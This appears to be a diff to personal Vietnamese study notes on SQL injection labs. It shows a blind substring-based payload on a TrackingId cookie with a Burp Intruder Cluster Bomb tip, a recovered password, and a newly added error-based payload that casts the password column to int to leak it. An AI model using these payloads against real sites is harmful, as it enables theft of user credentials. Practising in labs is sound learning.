@@ -115,3 +115,7 @@ TrackingId=xyz' AND (SELECT SUBSTRING(password,[n],1) FROM users WHERE username 
 LƯU Ý : Dùng tab Intruder , Chỉnh attack type thành Cluster Bomb để đổi được nhiều giá trị (giống [m] và [n])
 => 20 kí tự
 pass : lfpv794meqaknkvo4u1n
+
+SQL Injection Blind error (ép kiểu để in ra lỗi)
+TrackingId=' and 1=cast((select password from users limit 1) as int) -- 
+lưu ý : 'and 1=cast'
